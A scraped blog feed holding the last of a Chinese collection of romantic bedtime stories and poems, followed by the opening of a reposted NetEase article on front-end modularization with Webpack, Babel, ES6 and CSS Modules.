<p>女孩醒了过来，才明白昨晚是男孩照顾了她。她红着脸向男孩道谢。男孩带着女孩在森林里游玩。<br>那些高大的树干上，布满了青色的藤蔓，藤蔓上开着五颜六色的小野花。几只小鸟在树冠里叽叽喳喳的跳来跳去。</p>
<p>男孩看着那些粗壮的庞然大物，费解的摇摇头，你们这些老家伙为什么会甘心做一棵树呢？像我这样能走路能说话难道不好吗？</p>
<p>那些老树告诉他，那是因为你还没有找到作一棵树的理由。</p>
<p>男孩给她摘了很多好吃的果子，带她在小河里钓鱼，抓蝴蝶。</p>
<p>女孩给他讲她所见到的世界各地的景观，和很多趣闻。她说她的梦想就是游遍全世界。</p>
<p>她问男孩，你愿意和我一起去周游世界吗？</p>
<p>男孩愣了一下，然后毫不犹豫的答应了她。</p>
<p>第三天早上，当男孩和女孩打算离开森林的时候，男孩听到了森林里的树都在阻止他。但是他不想要这样的生活，他只想和她在一起。完成她的梦想。他拉着她的手，大步的离开了森林。</p>
<p>他们沿着大路，向最近的一个村庄走去。随着时间的推移身后的森林越来越远，但是每当他们回头，还是可以看到那片森林。因为那些树太高了。</p>
<p>下午的时候，天气突然大变，一眨眼的工夫，暴风雨骤起！</p>
<p>男孩拉着女孩拼命向前奔跑，可是前面的路还很长，村庄遥遥无望。</p>
<p>女孩就像一只无助的蔷薇，在狂暴的风雨里颤颤发抖。男孩紧紧地抱着柔弱的身躯，可是无济于事。</p>
<p>这时，他们脚下一滑，摔倒在泥水里。女孩晕了过去。</p>
<p>男孩忽然想起老树们的话，女孩脆弱的身体绝不能再经历第二次暴风雨了。也想起了自己要保护她的承诺。</p>
<p>他看了看怀里的她，叹了一口气。低下身子吻了吻她的脸颊。</p>
<p>然后男孩后退了两步，用力把双脚插进大地。昂首张开双臂。</p>
<p>他的脚立刻化作具有无限生命力的根须，钻向深深的地下，紧紧抓住大地。他的双臂上生出无数绿色的枝条，枝条向四面八方长大，变粗变长，然后又生出更多的枝条。</p>
<p>男孩健硕的身躯消失了，取而代之的是结实有力的树干，屹立在暴风雨中纹丝不动，仿佛战无不胜的泰坦巨人。</p>
<p>短短的几分钟里，女孩的身边出现了一棵笔直高大的巨树，就像森林里那些一样。树冠把狂和雨水完全的遮挡在了外面。</p>
<p>而女孩，静静的躺在树下。</p>
<p>黄昏的时候，暴风雨停了。</p>
<p>女孩也醒了过来。</p>
<p>她伤心的发现，男孩已经不见了。她心想，也许他反悔了，或者害怕了。她很难过，因为他没有履行他的承诺，陪她完成她周游世界的梦想。</p>
<p>女孩背起行李包，独自向前走去。</p>
<p>走了几步，感觉忘记了什么似的回头一看。</p>
<p>她终于看到了那棵树。</p>
<p>一棵奇怪的长在路中间的巨树。</p>
<p>一定是这棵树帮她遮挡了暴风雨。</p>
<p>她看着树轻声说道，谢谢你。</p>
<p>然后她背着包，沿着那条路，向着太阳落山的方向走去。</p>
<p><strong>在暴风雨里，我不能变成一支雨伞，脆弱的躺在你手心。我只会张开双臂化作一棵树，很大很大的树，当你在我身边的时候，我会保护你不受任何伤害。</strong><br><strong>如果你要离开，我也只能拼命地生长，向上生长。长到云朵之上，直直的冲向天际。这样，不管你在世界的那个角落，都能够看到我。我也能够看到你。你是流浪的旅人，我是永生不息的树。我日日夜夜的朝天生长，只为了让远方的你，能够看到天上的我。因为你的梦想在远方，我的梦想在天上。</strong></p>
<p>&lt;晚安&gt;</p>
<blockquote>
<h3 id="晚安小故事之-一百零一次的陌生人"><a href="#晚安小故事之-一百零一次的陌生人" class="headerlink" title="晚安小故事之: 一百零一次的陌生人"></a>晚安小故事之: 一百零一次的陌生人</h3></blockquote>
<p>那一年，男孩十八岁，女孩十七岁。</p>
<p>他们有着各自的班级，各自的朋友圈子，各自的故事。就像两条平行线，永远不会有交汇的那一刻。</p>
<p>可人生总是充满了不确定性。</p>
<p>在一个平凡的午后，柔和的阳光均匀的洒在小路上，男孩和女孩无意间相遇，擦肩而过——这是他们第57次意外的相遇。两个人依然没有开口说话，平静的擦肩而过，脸上似乎带着笑意，仿佛一潭湖水的表面，若有若无的荡漾着一圈圈涟漪。</p>
<p>如果有一天，男孩开口了，他会不会告诉她“你的眼睛真漂亮”；</p>
<p>如果有一天，女孩开口了，她也许笑着说“这可是你第32次脸红了哟”。</p>
<p>可是人生没有“如果”。我们这辈子，往往会为了某种理由去做一件事，或者为了某种理由拒绝做那件事。</p>
<p>两个陌生人，他们一共擦肩而过了101次，之后再也没有相遇过。也许他们这辈子的缘分，堪堪的只够见一百零一面而已。</p>
<p>你说，如果我们，可以重新来过。这样的开始，以及这样的结局，对于我们而言，会不会更合适。</p>
<p>有些人，没有故事，会不会让回忆更美好。</p>
<p>&lt;晚安&gt;</p>
<blockquote>
<h3 id="晚安小故事之-那个在雨天爱上你的孩子-也许晴天了就不再爱你"><a href="#晚安小故事之-那个在雨天爱上你的孩子-也许晴天了就不再爱你" class="headerlink" title="晚安小故事之: 那个在雨天爱上你的孩子,也许晴天了就不再爱你"></a>晚安小故事之: 那个在雨天爱上你的孩子,也许晴天了就不再爱你</h3></blockquote>
<p>1.</p>
<p>不管是南方还是北方，夜空都是黑色的。</p>
<p>黑的那么深那么固执。</p>
<p>占星师说，如果一个人能看透星空，就能知道他心里藏着什么</p>
<p>埋在我内心深处的是什么？我也许永远无法知晓。</p>
<p>2.</p>
<p>上帝很公平，他让每个人知道的东西是有限的。我知道：天黑了，太阳会下山；下雨后，彩虹会现身；人活着，总会死去。</p>
<p>就如同我知道，我爱你但是你不爱我。</p>
<p>不对，我不知道我爱不爱你。我猜也许爱，也许不爱，这是我生命中唯一的一点变数，两者的区别远远大于南极和北极，大于无穷小和无穷大，大于生和死。</p>
<p>好吧，其实都是一回事，都只是一个念头而已。无关紧要的小念头。</p>
<p>3.</p>
<p>哈雷彗星76年才能见太阳一次，但是它俩的一生中依然可以相遇几百万次。有的流星匆匆划过，就再也不会回来。爱因斯坦说，只要相对速度达到光速，它们就永远不会看到彼此。</p>
<p>永远这个词很可怕，不管什么东西沾上它就会变得面目全非。</p>
<p>这个犹太科学家说，根据相对论，当你想一个人时，如果你爱她，时间会走得飞快，如果你恨她，时间会走得很慢。</p>
<p>为了能想你更久一些，我决定开始恨你。</p>
<p>4.</p>
<p>霍金说，一切都有尽头，连宇宙会有尽头。如果一个人说爱你到太阳不再升起，意思是最多爱你五十亿年；如果一个人说爱你到宇宙末日，那么起码能爱你二百亿年；所以说誓言这东西也可以含水分的。</p>
<p>那个在雨天爱上你的孩子，也许晴天了就不再爱你。</p>
<p>只是那场大雨，在心里下了很多年也没有放晴。</p>
<p>5.</p>
<p>那天我在望远镜上看到一颗非常美丽的星星，我很想告诉你。</p>
<p>但是我想起这颗星星也许离我们非常远，以至于我看到的光只是很多年前的。</p>
<p>而现在的它，已经死了吧。</p>
<p>我们来自尘埃，总有一天要回去。</p>
<p>抬头看着天上的那些星星，你不会知道哪些还活着，那些已经化为尘埃。</p>
<p>还好那星光，我看到了，也记住了。</p>
<p>我会用力的记住，因为那是他们闪耀过的证据。</p>
<p>6.</p>
<p>《小王子》里面有三件东西叫我念念不忘。</p>
<p>狐狸。玫瑰花。星星。</p>
<p>我曾经幻想你是我的狐狸，还是我的玫瑰花。</p>
<p>后来我怀疑你是我的星星。</p>
<p>占星师告诉我，只要把一百万本法典背下来就能预测星星的轨迹。</p>
<p>我很笨，总是拼命背也记不住。</p>
<p>所以我找不到你。</p>
<p>7.</p>
<p>我从小就喜欢趴在阳台看星星。</p>
<p>我以为我喜欢的是天文学。</p>
<p>后来才知道那叫占星。</p>
<p>因为不靠谱。</p>
<p>而事实上，天文学是一件更不靠谱的事。</p>
<p>不管是占星还是天文学，都不靠谱。</p>
<p>因为星星，是会变的。</p>
<p>8.</p>
<p>海森堡说，你没法同时预测出她的行为和想法。即测不准原理。</p>
<p>我多次试验之后，对此深信不已。</p>
<p>那颗星星再也没有出现过，纵使在梦里。</p>
<p>也许我念念不忘的是某种幻觉。</p>
<p>幻觉来自于马达加斯加的蝴蝶或者亚马逊丛林的花蘑菇。</p>
<p>9.</p>
<p>我抬头望着夜空，星星洒满了整个苍穹，浩浩荡荡的。</p>
<p>我总是不说话的，静静地望着它们。</p>
<p>笨笨的我不知道哪一颗是你。</p>
<p>但我知道，你就在那里。</p>
<p>一刻也未曾改变。</p>
<p>10.</p>
<p>占星师说，如果一个人能看透星空，就能知道他心里藏着什么</p>
<p>埋在我内心深处的是什么？</p>
<p>我也许永远无法知晓。</p>
<blockquote>
<h3 id="你适合想念，不适合相见"><a href="#你适合想念，不适合相见" class="headerlink" title="你适合想念，不适合相见"></a>你适合想念，不适合相见</h3></blockquote>
<p>我还守在这日落的山崖，哼着不知名的歌，</p>
<p>那些屠夫从我眼前飞过，没有搭理我。</p>
<p>枯叶沙沙攀爬，挤挤攘攘的在背后嘲笑，</p>
<p>时间倒着跑，河水透出血色。</p>
<p>阴影里散发臭味的是一条毒蛇，</p>
<p>吐着信子咬过来，</p>
<p>却坠入山坡。</p>
<p>我守在故事的起点，</p>
<p>以为你会路过。</p>
<p>太阳追着月亮，月亮藏进星河。</p>
<p>轮回了好多遍才想起，</p>
<p>你不会来见我。</p>
<p>因为这个故事里，</p>
<p>只有我一个。</p>
<p>我呆坐在山崖边哼着小歌。</p>
<p>假装你在身边，我驾着时光的小马车。</p>
<p>慢慢的我长在了石头里与野草做伴，</p>
<p>但你一定能看到</p>
<p>我在笑着。</p>
<blockquote>
<h2 id="节选自（落幕：时光之外的终点）"><a href="#节选自（落幕：时光之外的终点）" class="headerlink" title="节选自（落幕：时光之外的终点）"></a>节选自（落幕：时光之外的终点）</h2></blockquote>
<p>太阳出来了<br>恶魔急忙躲进城堡的塔楼里，它怕吓坏公主，它不敢和她见面，只想永远守着她；</p>
<p>太阳出来了<br>森林里的雪人融化了，融化的时候他在笑，因为他的心已经被刺猬带走了；</p>
<p>太阳出来了<br>小蝴蝶嘟囔着关于流星雨的梦话，酣睡在小披风的背上，她错过了无数的流星，却得到了对的人；</p>
<p>太阳出来了<br>小百合打开窗户，一脸失望，见习死神还是没来。她想也许只有自己老得睁不开眼的时候，见习死神才会来到她身边，带她离开。总有一天，他们会见面；</p>
<p>太阳出来了<br>这只是平凡的一天。茫茫的星海，茫茫的人海，遇上了，错过了。重新开始，那个答案一定藏在我目光无法企及的某个角落；</p>
<p>太阳出来了<br>旅人伸着懒腰从粗壮的树干上跳下来，戴着那顶草帽继续周游世界。决定我们是否能够到达远方的，不是因为我们有什么样的能力，而是因为我们有一颗怎样的心；</p>
<p>太阳出来了</p>
<p>木头人手捧鲜花在路边站了七天七夜。他终于明白，小女孩是不会来了，于是他把鲜花种在路边，离开了这里；</p>
<p>太阳出来了</p>
<p>穿着布衣的小公主拉着牧羊人跑进自己建造的小花园，手舞足蹈的讲述着每一株花草的来历，不小心被花刺破了手指，牧羊人无奈的把她的手指含在嘴里吸出那颗刺；</p>
<p>太阳出来了<br>山顶上的雪人还在微笑着，这是小猴子陪她看的第七十三万八千次日出，说好了的一百万次日出，少一次都不行；</p>
<p>太阳出来了<br>月亮之子消失了，但他知道，路边永不熄灭的篝火会给女孩温暖。我想温暖这个有你的世界；</p>
<p>太阳出来了</p>
<p>丁丁默默地注视着远处的莎莎，看着她无忧无虑的寻找食物，这才明白，忘却是一种幸福。丁丁叹了口气，摇摇尾巴，游走了；</p>
<p>太阳出来了<br>小狐狸不得不离开了。他失望的看着那道从来没有打开过的门。不管在梦里还是现实，我都在你身边，哪怕那扇门一直是紧锁着；</p>
<p>太阳出来了<br>女孩已经到了下一个目的地，男孩化作的那棵树依然静静的立在那里。</p>
<p>我们对这个世界充满了戒备，警惕，伤害也许来自任何一个方向，任何一种方式。然而，有一种安全感，在第一眼就可以识别。那种安全感可以来自于一个陌生人。它会让你知道，你能够在他面前放下一切的荆棘和盔甲。因为这世上，真的存在着一种没有任何理由的信任，单纯而纯粹的信任。</p>
<p>每个人都有自己的终点，一个又一个的终点。每一次终点，我们都会有新的成长，我们就像是一棵树，慢慢长大，然后知道了自己想要什么东西，想成为什么样子，于是更加起劲的继续生长。不管是在时间中旅行，还是在空间中旅行，在一切的终点，我们会找到答案。</p>
<blockquote>
<p>这是按照原本的顺序写下的终篇。我在这里发的故事，顺序重新编排了。原本的19篇故事，不只是从摸索到轻车熟路，也是内心的演变。</p>
<p>然而这些都不重要。<br>对于你们而言，重要的是这些故事。</p>
<p>这一切，对我而言，也成为了一个未完待续的故事，故事的名字叫“story先生和他的晚安小故事”<br>我们活着，慢慢长大，遇到，离开，这是一个万物生长的年代。</p>
<p>每一天的太阳都是新的，生活总是拥有无限的生机。<br>还会有许许多多的故事诞生，我还是会讲给大家听。</p>
<p>因为我，永远是一个讲故事的人。</p>
</blockquote>
<p><a href="https://www.zhihu.com/question/31092350/answer/51477188" target="_blank" rel="external">https://www.zhihu.com/question/31092350/answer/51477188</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;睡前小故事&quot;&gt;&lt;a href=&quot;#睡前小故事&quot; class=&quot;headerlink&quot; title=&quot;睡前小故事&quot;&gt;&lt;/a&gt;睡前小故事&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;狂奔的小军&lt;/strong&gt;，讲故事的人/互联网筑基阶段/乐观的单身狗&lt;/p&gt;
&lt;blockquot
    
    </summary>
    
      <category term="文学" scheme="http://www.wanglinzhizhi.me/categories/%E6%96%87%E5%AD%A6/"/>
    
    
      <category term="程序员的浪漫" scheme="http://www.wanglinzhizhi.me/tags/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB/"/>
    
      <category term="文学" scheme="http://www.wanglinzhizhi.me/tags/%E6%96%87%E5%AD%A6/"/>
    
      <category term="爱情" scheme="http://www.wanglinzhizhi.me/tags/%E7%88%B1%E6%83%85/"/>
    
      <category term="爱情 狂奔的小军" scheme="http://www.wanglinzhizhi.me/tags/%E7%88%B1%E6%83%85-%E7%8B%82%E5%A5%94%E7%9A%84%E5%B0%8F%E5%86%9B/"/>
    
  </entry>
  
  <entry>
    <title>十年•杭研技术秀 | 网易蜂巢的工业化前端架构</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E7%BD%91%E6%98%93%E8%9C%82%E5%B7%A2%E7%9A%84%E5%B7%A5%E4%B8%9A%E5%8C%96%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%9E%84/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/网易蜂巢的工业化前端架构/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="十年•杭研技术秀-网易蜂巢的工业化前端架构"><a href="#十年•杭研技术秀-网易蜂巢的工业化前端架构" class="headerlink" title="十年•杭研技术秀 | 网易蜂巢的工业化前端架构"></a>十年•杭研技术秀 | 网易蜂巢的工业化前端架构</h2><p>原创 <em>2016-11-28</em> <em>赵雨森</em> <a href="https://mp.weixin.qq.com/s?__biz=MzI2MzM3MzkyMg==&amp;mid=2247484013&amp;idx=1&amp;sn=b235847337830845c5887c7c360dde10##" target="_blank" rel="external">网易云</a></p>
<p><img src="http://mmbiz.qpic.cn/mmbiz_png/0tqmmR6jQORchpgdnmlciaHEVbibSEK29SJq45K1IKy5ADKMTWm5udTe8188WviaD6jncKO4z9USz01CAjLzTibMXw/0?wx_fmt=gif&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt="img"></p>
<p>2016年对于<strong>网易杭州研究院</strong>（以下简称“<strong>杭研</strong>”）而言是重要的 - 成立十周年之际，杭研正式推出了网易云产品。“<strong>十年•杭研技术秀</strong>”系列文章，由杭研研发团队倾情奉献，为您展示杭研那些有用、有趣的技术实践经验，涵盖云计算、大前端、信息安全、运维、QA、大数据、人工智能等领域，涉及分布式架构、容器、深度学习等前沿技术。正是这些宝贵的经验，造就了今天高品质的网易云产品。本文的分享来自网易蜂巢团队，阐述工业化前端架构的整体思路。</p>
<p>【文中网址请复制到浏览器查看】</p>
<p><img src="http://mmbiz.qpic.cn/mmbiz_png/0tqmmR6jQOTl4C0cbSyMxtwvH8dA90o308wYs6jRFpsTIibTI9dQaqwPZGMdoXwVIAhBJ88QnXUNib93H6yxofPg/0?wx_fmt=gif&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt="img"></p>
<p>近两年前端领域风云变幻，各种技术栈层出不穷。React、Angular2、Vue2逐步三分天下，Webpack + Babel + ES6模式如日中天，PostCSS大有取代SASS、LESS、Stylus的趋势，还有HTTP2、WebComponents、WebAssembly、函数式编程等新概念不断涌现。让我们这些前端工程师应接不暇、感叹不已：“今年一个技术还没学会，明年可能就不用学了。”</p>
<p>回顾前端发展历史，按照@xufei《前端开发技术的发展》一文中的观点，大概可以分为三个阶段：</p>
<ul>
<li>刀耕火种：典型特征是服务器语言（ASP、JSP、PHP）为主，结合简单的CSS和JS代码片段。是最早期的WebPage模式；</li>
<li>手工工场：典型特征是Ajax的出现，它使得WebApp模式成为可能。这期间jQuery、Prototype和Mootools几个库占主导地位，并出现了初步的模块加载方式；</li>
<li>工业革命：典型特征是各种MV*框架的不断出现，各种开发模式的不断演进，各种自动化工具的不断革新，各种标准的不断确立。</li>
</ul>
<p>2015年ES6标准的确立标志着前端领域正式进入了蒸汽时代。但离流水线作业的电气时代还有一段路要走。</p>
<p>相对于去年剧烈的变革，今年的前端生态有所缓和。乘着工业化浪潮，我们网易蜂巢产品（以下简称蜂巢 <a href="https://c.163.com/）前端组本着面向未来、稳步推进的原则，也对项目架构进行了优化改进，并确立了新的发展方向。" target="_blank" rel="external">https://c.163.com/）前端组本着面向未来、稳步推进的原则，也对项目架构进行了优化改进，并确立了新的发展方向。</a></p>
<p>本文以蜂巢产品下的蜂巢系统、镜像中心、数据库助手、ICP备案系统和域名系统五个单页系统（SPA）为例，阐述我们组工业化前端架构的整体思路。</p>
<p>本文认为关于前端架构的工业化，主要应该从模块化、组件化、规范化和自动化四大方面考虑，下面一一展开。</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p><strong>模块化</strong></p>
<p>“分工产生效能。”</p>
<p>模块化是“刀耕火种”和“手工工场”的分界线。它的作用是将一个大文件拆分成相互依赖的小文件，再进行统一的拼装和加载，这为多人协作提供了可能。</p>
<p><strong>JS的模块化</strong></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p>在ES6之前，JavaScript一直没有模块系统，这对开发大型复杂的前端工程造成了巨大的障碍。</p>
<p>对此社区制定了一些模块加载方案，如CommonJS、AMD和CMD等，某些框架也会有自己模块系统，如Angular1、我们公司的NEJ等。总之一个比一个实现得丑，最后甚至还发展出了为了兼容几种规范的变态级UMD：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">root, factory</span>) </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> exports === <span class="string">'object'</span>)</div><div class="line"></div><div class="line">        <span class="built_in">module</span>.exports = factory();</div><div class="line"></div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> define === <span class="string">'function'</span> &amp;&amp; define.amd)</div><div class="line"></div><div class="line">        define(factory);</div><div class="line"></div><div class="line">    <span class="keyword">else</span></div><div class="line"></div><div class="line">        root[library] = factory();</div><div class="line"></div><div class="line">&#125;)(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">//module ...</span></div><div class="line"></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>幸运的是，现在ES6已经在语言层面上，规定了模块系统，而且使用起来相当方便，完全可以取代现有的CommonJS和AMD规范。</p>
<p>当然在2016年选择ES6不算尝鲜，各种生态已经相当成熟（如图1），唯一要考虑的因素就是兼容性要求。</p>
<p>图1 截止至2016年11月，各厂浏览器对ES6的支持率</p>
<p>（现代浏览器和Node.js稳定版均达到90%以上）</p>
<p>如果你想使用Babel：</p>
<ul>
<li>IE6、7就不用考虑了（貌似我们公司有项目还在支持）；</li>
<li>IE8在项目中不能使用export * from ‘xxx’这个功能，但你不能保证使用的依赖库中没有用到，具体请参考使你的 React 应用兼容 IE8（<a href="https://github.com/xcatliu/react-ie8）；" target="_blank" rel="external">https://github.com/xcatliu/react-ie8）；</a></li>
<li>IE9+只需吃个babel-polyfill就能完美使用。</li>
</ul>
<p>我们的蜂巢是技术型产品，只要兼容到IE9+即可，所以上ES6毫无压力。至于打包工具，目前来说最好的非Webpack莫属。因此，</p>
<p><strong>技术选型：Webpack + Babel + ES6</strong></p>
<p><strong>CSS的模块化</strong></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p>虽然SASS、LESS、Stylus等预处理器实现了CSS的文件拆分，但没有解决CSS模块化的核心问题：选择器的私有化问题（全局污染问题）。</p>
<p>按道理，一个模块化的文件应该要隐藏内部作用域，只暴露少量接口给使用者。而按照目前预处理器的方式，导入一个CSS模块后，已存在的样式有被覆盖的风险。虽然重写样式是CSS的一个优势，但这并不利于多人协作。</p>
<p>为了避免全局选择器的冲突，各厂都制定了自己的CSS命名风格：</p>
<ul>
<li>BEM风格；</li>
<li>Bootstrap风格；</li>
<li>Semantic UI风格；</li>
<li>我们公司的<strong>NEC风格</strong> (<a href="http://nec.netease.com/standard)；" target="_blank" rel="external">http://nec.netease.com/standard)；</a></li>
<li>…</li>
</ul>
<p>但这毕竟是弱约束。选择器随着项目的增长变得越多越复杂，然后项目组里再来个新人带入自己的风格，就更加混乱了。</p>
<p>所以我很赞同知乎上一个人的观点：</p>
<p><strong>与其费尽心思地告诉别人要遵守某种规则，以规避某种痛苦，倒不如从工具层面就消灭这种痛苦。</strong></p>
<p>从工具层面，社区又创造出Shadow DOM、CSS in JS和CSS Modules三种解决方案。</p>
<ul>
<li>Shadow DOM是WebComponents的标准。它能解决全局污染问题，但也使样式彻底私有化了，造成外部无法重写，损失了灵活性；</li>
<li>CSS in JS是彻底抛弃CSS，使用JS或JSON来写样式。这种方法很激进，不能利用现有的CSS技术，而且处理伪类等问题比较困难；</li>
<li>CSS Modules仍然使用CSS，只是让JS来管理依赖。它能够最大化地结合CSS生态和JS模块化能力，目前来看是最好的解决方案。</li>
</ul>
<p>目前蜂巢产品中使用的是我们公司@郑海波（<a href="https://www.zhihu.com/people/leeluolee）写的MCSS（https://github.com/leeluolee/mcss），一个比SASS好用的预处理器。" target="_blank" rel="external">https://www.zhihu.com/people/leeluolee）写的MCSS（https://github.com/leeluolee/mcss），一个比SASS好用的预处理器。</a></p>
